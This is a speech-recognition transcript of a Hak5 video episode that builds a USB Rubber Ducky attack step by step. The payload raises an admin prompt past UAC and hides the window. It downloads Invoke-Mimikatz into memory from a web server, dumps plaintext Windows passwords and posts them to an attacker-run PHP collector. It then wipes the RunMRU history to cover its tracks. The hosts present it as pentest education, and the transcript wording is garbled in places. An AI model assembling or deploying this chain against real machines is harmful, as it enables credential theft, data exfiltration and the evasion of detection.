plugging in a USB Drive how about
distracting him for the briefest of
moments as we sell recently on mr. robot
15 seconds of physical access in a USB
rubber ducky is all it takes to swipe
passwords from an unattended PC in honor
of this appearance we are covering 15
second password hacks mr. robot style
pilfering passwords with the USB rubber
ducky
hello that's my cut I do that part who
runs the show I do it's my show I run
this shit everyone welcome to this
episode of hack 5 this is your weekly
dose of Technol as my name is Shannon
Morris I'm her co-host Aaron kitchen
it's a pleasure to be here Shannon it's
a very exciting week for us it is you
know why yes I do because it's written
right there it says that we did a cameo
on mr. robot I didn't so heck five had a
cameo on mr. robot recently with the
appearance of our USB rubber ducky which
was super super cool they even like
called out by name rubber duck right
exciting is that in fact I actually I
have it right here I'm just gonna go
ahead and do it cuz this is fair use
right I think yeah that's fair use yeah
so it's like hey this is a rubber duck
all else fails you find an FBI laptop
anywhere on the floor usually Panasonic
Toughbook
blunt this get it wait 15 seconds then
yank it okay thanks to a tool called
maybe cats it'll pull all cash passwords
and domain info linen save them on this
so so awesome right we're not gonna get
a takedown for that no I don't think so
in fact I mean if they did I did say in
a honor of this appearance we're going
to go ahead and recreate this Hollywood
hack by showing how easy it is to deploy
malware and exfiltrate data with the USB
rubber ducky yes cuz that was really
cool that they just what they show it
off a real hack it was a real hack so
the payload that was mentioned on the
show is called the twin duck me me cats
that was showed off by us in season 15
episode 3 so check that out for the
technique it saves the passwords back to
the duck we'll put the link in the show
notes and I believe we can stick like a
card thing over here
alright card up there nice so if you're
new to this and you haven't been
following along for a while the USB
rubber ducky is the first keystroke
injection attack tool it's this little
guy we invented this in 2010 it looks
like a USB Drive it smells like a USB
Drive really just fit I did yeah cuz it
I don't bite them like you I doesn't
taste like a USB Drive anyway it types
like a keyboard though it types over oh
it actually does not taste very good
when you try the PCB instead
actually what's inside it it's not a
regular thumb drive it's a keyboard
that's keyboard emulator so it types
over a thousand words per minute and it
types these specially crafted payloads
for the duck which basically mimic the
user entering these keystrokes into the
computer at superhuman speeds and that
means that anybody with social
engineering or physical access skills
can go ahead and deploy these duck
payloads as long as you can find like a
free moment with their targets computer
which we all know plenty of those happen
oh yes in fact if you come to pen test
with hak5 shenanigans is all I'm gonna
say whatever Brenda right okay so
basically it's a tool that violates the
inherent trust that computers have in
human since we as humans primarily
communicate with keyboards using or with
computers using keyboards and sometimes
computer Mouse's so in essence computers
trust the USB rubber ducky because they
just think oh it's a keyboard right I
mean it's all I mean I guess technically
it's it's a hidden tax innit it's a
violation of the human interface device
specification which includes keyboards
mice joysticks things of that nature and
we're just emulating those humans
because if I had 30 minutes with your
computer yeah I could totally own it but
I don't have 30 minutes I've got 30
seconds while I distract you so if
pre-programmed they're getting something
out of the printer mm-hmm
so we're actually going to take this a
step further because we've already
covered the method that they used on the
show or mentioned on the show that mimic
hats that saves it back to the disk
that's this one on episode season 15
episode 3 so highly recommend check that
out but instead we're going to be using
a variant hmm so the variant is called
the variant okay so it's very on me
Mehcad which if you're not familiar to
buy a gentle kiwi and it's a tool that
dumps clear text credentials out of
memory from windows as opposed to the
older technique which I believe we've
even covered in like back in season 5
where you would dump hashes and then
crack those hashes so ntlm and LM hashes
and then run cracking tools with this
gentle kiwis tool mini cats just pulls
the actual plaintext password right out
of memory so you don't even need to
crack the hashes although it also gives
you the hashes and all these other
awesome credentials so it's a fantastic
tool it's the so the full name is
invoked
Mimmi cats that's the variant bye-bye
a climber quant ah I hope I'm
pronouncing that right so it's big and
that invoke mimikatz variant is one
written in PowerShell which goes ahead
and in Rochelle it well which is
fantastic because that's like been built
into Windows since Windows 7 and it
injects mini cats directly into memory
so it never touches the disk which means
that there's nothing for like antivirus
to like find a file on the computer
anyway so what these are doing is
they're going directly to the RAM to
your memory and messing around with Ram
so if they don't even touch any files
with like save passwords or anything
like that it's just the passwords that
are saved on your RAM exactly it's so
cool and you've further altered a method
by our friend move Excel so move X does
Metasploit minute he sent us this cool
alteration to pull the script from a web
server using PowerShell yeah right so
when we're done with this we made a
little alteration and basically when
this is done when ready to deploy this
what's going to do is this payload will
go ahead and open it admin command
prompt bypassing us see we're going to
do a little obfuscation we're going to
download and execute invoke mimikatz
into memory we're going to go ahead and
run that getting those clear text
passwords then we're going to send those
passwords back up to our own server up
in the cloud so we can store them for
later enjoyment and when it's all said
and done you're basically just going to
have a USB drive that you can plug into
any computer and in 15 seconds Oh Nicole
this is gonna be fun and luckily this
does not take that many things so what
you'll need to pull off this attack are
of course any web server on the internet
with PHP and preferably something mostly
anonymous beyond this segment the USB
rubber ducky
of course the ducky script payload
invoke mem and cats powershell file and
credential saving PHP scripts and all of
those we are going to be showing off
today and everything we've luckily
covered in a very nicely documented blog
article posted by Darin over at hak5 org
so you can read along with this as well
yeah it's going to be fun so let's go
ahead and begin with step one which is
writing the payload so we should
probably talk about how
ducky payloads are put together and I'm
going to switch over to my calli machine
so we can kind of get into that so
essentially the USB rubber ducky scripts
are written in what our electrical ducky
script it's a very simple ridiculously
simple the scripting language that can
be written in any regular text editor
whether it's notepad or Vie or Emacs
it's actually V I know it's it's VI well
or to them but now it's via is it like
that so it's pronounced the original
creator set it as VI naught by I learned
something new every day I love it what I
can teach Darrin kitchen things well I'm
gonna use nano because I like nano so
much that I named a pineapple after it
anyway any text editor and I'm gonna go
ahead and break down this script into
five different sections
the very first being to cool your jets
ray okay so first thing we're going to
do is start with a little REM and REM is
short for remark and this comes from
basic and other programming languages
you may have like two slashes or
semicolon or things of that nature and
really all I want to do here is just
kind of give it a title in an author and
hey give mad props to the shoulders of
the Giants of the people who which we
are standing upon that sentence made
sense to me uh-huh but essentially the
most important part at this very
beginning stage is to do a delay 1000
and what that means is we're going to
just chill out for 1,000 milliseconds
and that's one second obviously and that
just means that we're going to give the
computer that we're plugging our duck
into like one second to like be like Oh
what keyboard in like you know enumerate
that and that's because like computers
are sometimes slow you never know right
and you know if you just plug in and
immediately start sending keystrokes
within the first like millisecond it'll
be like oh or keyboard and then you've
already typed like them the whole
sentence so yeah you just don't want to
miss it okay and and of course like if
you're hacking a 486 you're gonna put in
some more delays you still use a 486 I
did you know um my boy strong bad does
cuz he's all chuckling you know
apparently I used to use one when I was
like a little little kid right just
banging on the keyboard I don't know
what I'm doing yeah you know I'm
thinking mild I'm thinking a lapi 386
yeah whoa
luck adored lass how are you I'm sorry I
just now I want to stop watching stop
watching this go watch strong bad
comeback okay step two what we're going
to do is we're going to open it admin
command prompt so that's what this
section here is so basically GUI R is
the equivalent of Windows key R and then
we're going to type this PowerShell here
so that's what string means string means
go ahead and type this let me put this
in my clipboard we're going to hit enter
followed by alt Y so let's go ahead and
do this in this windows VM to check that
out so at every window every version
windows since windows 95 windows key R
will pull up this little run line and
you'll actually notice I already have
that in there because it was the last
command written but I'll go ahead and
well I'll grab it from the history there
we go so that's what it's going to do
it's going to pull this up and type this
PowerShell okay so what it's doing is
doing a start process what process are
we starting CMD okay that's the command
prompt
well this verb run as what run a s means
is run as administrator' so okay we're
going to be prompted by UAC
which means oh no it's thort adorability
to become the administrator except for
the fact that if you hold down alt now
notice this is notice by Y and n those
weren't there a second ago here let me
let me say no and restart this so you
can see so see how it's underlined yeah
why so you can those dos y yeah if you
hold down alt and hit Y that's what it's
going to do without you having to click
so I just hit all Y and there we are
yeah we have the administration command
prompt awesome right
and so voila we have a command prompt
everything is good to go okay so now
that we have that up and running and
open it's gonna be kind of obvious like
when I walk back to my computer after
getting something off the printer that
somebody's been messing with my computer
right I mean normies are not used to
seeing terminals open that's scary
hackers are gonna freak them out yeah
actually oh I know I don't remember the
I'll show you as a tip next week on how
to get that but some green text to be a
real hacker anyway um pretty much you'll
see you'll see so what we're going to
want to do in this case is
a bit of obfuscation of the command
prompts because while it's not always
necessary it is nice to kind of like
obscure the fact that you're doing all
this hacker good stuff and bring its
little attention to this as possible and
depending on your scenario it may or may
not be necessary but let's just go ahead
and get into some of the techniques so
this next obfuscation technique here is
we're going to type in mode and then
here let me just pop that in my
clipboard so this command here mode con
calls
equals 18 lines equals one is telling
this command prompt to go ahead and
become 18 columns by one line boom Oh
ridiculously small so it's making it
small great the next one is to type in
color space capital F capital e and that
makes the background white and the
foreground yellow which is ridiculously
hard to see so it looks like a browser
window yeah I D here's we're just gonna
try to make it as tiny as possible and
white and kind of just blend in with the
other stuff on the screens data
thankfully this payload is so extremely
short that'll only be open for the
briefest amount of time anyway okay so
at this point we are ready to actually
download and to execute the payload
we're not messing with colors anymore
right so let's go ahead and get into
that the next part down here is this
power shell so let's go ahead and take a
look at this power shell so it's
actually just this one string and it's
kind of long and to make this easier I'm
actually going to go ahead and open
another command prompt but this one I'm
not going to up this gate because I want
you to be able to see this and I'll kind
of dissect this power shell okay so this
command right here obviously power shell
means hey command prompt go ahead and
execute this with PowerShell the IEX
part right here basically means invoke
expression that's a directive that tells
it to execute everything following this
rather than just echoing it back to the
command line then we have a new dash
object that command let creates an
instance of the microsoft.net framework
and then we're going to use net dot
webclient
net that web client is basically it's a
class that allows us to send and receive
data from standard web servers okay so
after that we'll do a download string so
this
here download string and then I'm
assuming that download something yeah it
does and character derp derp and what we
do is we just pass it a URL it's a
method that downloads this resource and
we specify in my case I'm specifying
HTTP colon slash slash Garen kitchen
slash creds slash I am for invoke
mimikatz ps1 for powershell and there
you go and so what this is the next part
right here it's setting a variable
dollar sign output and it's saying
invoke them in the cats with the dump
creds directive okay okay then what's
going to happen here is the resulting
passwords are actually going to be
stored in that dollar sign output
variable so then finally we're going to
follow this up notice we have like a
semicolon here so we're starting a new
command and that's going to be new
object just like before net web client
just like before and this time instead
of download string we're using upload
string upload string is a method that
takes two different parameters the first
one is a URL so in this case HTTP colon
slash slash Darin kitchen that that
would be your website not mine slash
creds /rx dot PHP that's a PHP script
that I have up there waiting for this
and what are we going to pass it dollar
sign output Oh so as long as we have
that rx dot PHP file living in the cloud
waiting for this it's going to be passed
as a HTTP POST is a just standard you
know web post over to this PHP script
and then you'll see that we're going to
save it and then for our later viewing
pleasure so I'm going to go ahead and do
this now I want you to understand that
in this example I'm using Darin not
kitchen be sure to change that to match
your own URL maybe you want to make it a
little less obvious who totally owned
their network but you know whatever yeah
I mean like if you care rad okay so now
that me me cats has run won't anybody
that's using the commuter computer next
notice that something suspicious going
on because they're going to see those
PowerShell commands in the history if
they're smart enough right absolutely
good let here let me go ahead and get
this running so I'll just execute that
and you'll see it's just executing the
background and it'll be done in just a
second but
to what you said if I pull up that run
line again windows key are gonna see a
yeah exactly so we probably want to
clear our tracks and since CMD this uh
this command prompt here doesn't
natively maintain a persistent command
history like you do in Linux everything
talks it's not like the terminal no it's
not like the Linux terminal if only
windows had bash that would be weird
we'd be living in some alternate
universe and nobody B would believe that
for a minute I'm still better um
everything typed into the command fog is
gone after we run the exit command 20
right so this run dialog though as well
as many others they maintains the
command history and those are stored in
the registry so as you can see this this
command finished right this powershell
and i'll show you the results of that
here in a second but let's go ahead and
do say we do exit and that's what we
would have done in our obfuscated
command prompt so they just can't see it
on TV to get rid of this what we're
going to do is we're going to use
another piece of PowerShell so if I come
down here after that the last part of
our duck script is to run this
PowerShell command right here so we pull
the command prompt back up and go ahead
and paste that PowerShell command like I
said what this is doing is it's using
the remove item command let this remove
- item property and we just go ahead and
pass it a path in this case it's the
path to a Windows registry item and then
the next thing we'll say is the name so
this tack name here and we're using
asterisk or star that's a wild-card card
okay and that's basically saying delete
all of the items in there especially
that item run mru so if you open up this
this and registry editor you're going to
see that it basically maintains the
history in there and this is just going
to clear the whole thing out so let's go
ahead and just execute this OOP and now
when I hit Windows key R you'll notice
that there are no it's all cleared out
okay so is there anything else to it I
mean yeah we have to encode it we have
to plug it into the dock we have to set
up our servers great that's it for the
ducky scrap okay so this payload is
going to be available on the forums and
we are also going to link it from your
article as well on hak5 org I'm assuming
that we're going to need to set up some
server
your side stuff also to make this
obviously work so let's go ahead and
take a quick break and then we'll get
back into that when we get back when
you've got that great idea like owning a
computer in 15 seconds or less you know
that you need to bring it to the
interweb and share it with the world
so please do what Shannon and I do and
that's head over to domain comm these
guys have an awesome domain discovery
system that'll help you choose the right
domain and they're easy checkout process
will have your website up and online in
no time flat and get this the guys over
at domain.com huge fans of hack 5 and
you guys so we have a special coupon
code just for you it's hak5 that tells
hack 5 and it'll also save you 20% at
checkout so check that out isn't that
awesome guys at domain.com are huge fans
and we want to show them support so even
if you don't need a domain this exact
moment you should tweet them at domain
comm and say hey thanks for supporting
hack 5 all these years and when you
think domain names think domain.com
now that the mimikatz ducky script has
been set up and it's pointing over at
our web server URL we are going to need
to encode the payload and then set up
the server itself right which means the
USB rubber ducky which is expecting in
fact here it is this little guy isn't
expecting not that not that text file
that we wrote but rather a file called
inject bin on the root of its micro SD
card there's a little SD card guy that
just goes in here which means that you
can carry around multiple payloads by
just carrying around multiple
inexpensive micro SD cards fantastic
anyway this inject op bin file that it's
expecting on the root of the micro SD
card is basically the binary equivalent
of that ducky script text file that we
wrote previously in Nano or you could do
it VI or we're gonna have to convert it
yeah we need to go ahead and convert
that and so to do that we use the duck
encoder so let me go ahead and show you
though what that looks like
token code so I have it right here and
you'll see if is I've got my invoke
mimikatz txt that's my payload and then
I've got my duck encode jar which is a
Java doc and codice coder so we'll do
Java Tech jar duck and code jar TAC I
for the input file which is invoke
mimikatz txt and then tack o inject bin
right so that
the output file so I run that now vai LS
again you'll see that I have an injected
end file all I have to do is put that on
the root of the micro sd card so let me
go ahead and pop that SD card in the
reader do you have to name it inject yes
you do okay so I've gone ahead and
plugged the card reader into the
computer I can see I have a new volume I
can open it up with files and see
there's already an inject up in file
there which I'm just going to go ahead
and delete or I'm going to rename it as
my backup and backup the bin because I
meant use that one later and so all I
have to do is now move that inject bin
over to in this case it's right there
that's the directory of my um of my SD
card reader and now I'll eject it
because it's important to safely inject
these SD cards yes it is which I have
now done with the eject command there we
go so at this point I can just go ahead
and take the SD card out of the computer
or out of the reader pop it into my duct
here okay and I can just go ahead and
plug it into the computers that I'd like
to target well I'm pretty sure anybody
know doc he already knows how to do that
well sure but if you're new to saying
that's how you encode about the server
set up the server man alright alright so
you need to host a copy of mini cats and
then provide a place to save the
passwords back to the web aren't we yes
we are and so to be on a date okay well
I'll show you how to do thing alright
fine so there's a little PHP script that
I use here let me go over here I'm on
this computer and E and let me have less
yeah and I've got a bunch of cred files
already on here but let me go ahead and
show you so basically what I'd use is
this tiny PHP script let me go ahead and
open it up in Nano and it's called our X
PHP for receive and this is it's just a
little too liner basically I create a
variable called file and I don't know
I'm just going to call the file whatever
the remote address is so this dollar
underscore server remote address that
gets the IP address of the remote host
so I know who I owned and then I'll you
know add an underscore just to make it
pretty and then a date and so this date
is the Year month the day and then the
hours and minutes and seconds okay and
then I'll name it I'll give
a dot creds because you know whatever in
fact I could make that like cred with a
Z to be all leet and stuff but really
the majority of it is when this file is
hit it'll do a file put contents which
takes you know whatever the input is and
puts it into a file well file
well that file that I just specified
which in this case is the IP address of
the remote host with the date stamp so
we'll always get a unique file name and
so what file contents will it get well
it's going to get those file contents
using this function here file get
contents from the special PHP directive
called PHP input and so what that means
is it's just going to take the raw input
of whatever it's receiving in this case
it's a post then it's just going to take
that raw post data and now put it into
that file and see that there may be some
inherent flaws with some of this stuff
but as long as you're protecting and
obscuring and do what you will and
comment below so because this works
because of the the nature of this how
you're transferring that information I'm
sure it goes without saying that HTTP
would probably be a preferred protocol
in this instance absolutely yeah so
check out a recent hack 5 episode it's
called about let's encrypt it's an
entire tutorial on setting up SSL on
your web server for free that makes it
very very easy it's surprisingly easy
and lastly in addition to the RX dot PHP
script which is going to receive that
HTTP POST data from your target PC you
will in fact need to also host invoke
mimikatz that PowerShell script so if I
come back over to here and close out and
not save an LS Tech la so you can see
all these files we have this I am for
invoke mimikatz ps1 file and that is the
latest version however I'll just go
ahead and point it out that if I let me
grab iceweasel here if you go to raw dot
github user content comm slash
manifestation slash power sploit slash
masters ledger exfiltration slash invoke
mimikatz ps1 you will get the latest and
this right here is the entire powershell
script and what's really cool about the
script on a page down because i want to
show off how cool this code is this is
all powershell but check this out
mimic hats requires a couple of dll's
and it requires a different one whether
or not you're using a 64 or
two bit machine and what's so cool about
this is this single powershell script is
going to detect it and you see all this
this is actually the dll i know but it
contains both the 32 and 64-bit versions
of these dll's so it's just I don't know
I just want to point this out this is
really cool stuff oh yes
and actually if since I'm in iceweasel
right now what I love about my really
terrible technique of using you know PHP
input and just saving it to a file I can
now just pull that up from any web
browser like on my phone so once I've
deployed this duck against a computer I
can just go and check the website and
see what the passwords are so this is
what it's going to look like because
we've already run it against our Windows
host if I come over to slash creds on
Darren kitchen you'll notice that I have
all these files and the most recent one
August 24 25th
the one that we just did a moment ago is
this is it so here's the output and
check that out let me make this as big
as possible
what are those linked as words right
there that is the password right yes
lame password I mean we get the LM hash
we get the ntlm hash and all of that but
right there in plain text we are now
ready to just go ahead and log into this
machine how exciting is that
so that's it that's it I mean we can
wall we can go ahead and see it in
action if you'd like I'll just pop back
over to this Windows box and I'm just
going to go ahead and plug it in so you
can see bloo-bloop and actually you see
it's like doing its thing and I'm just
going to go ahead and show you like
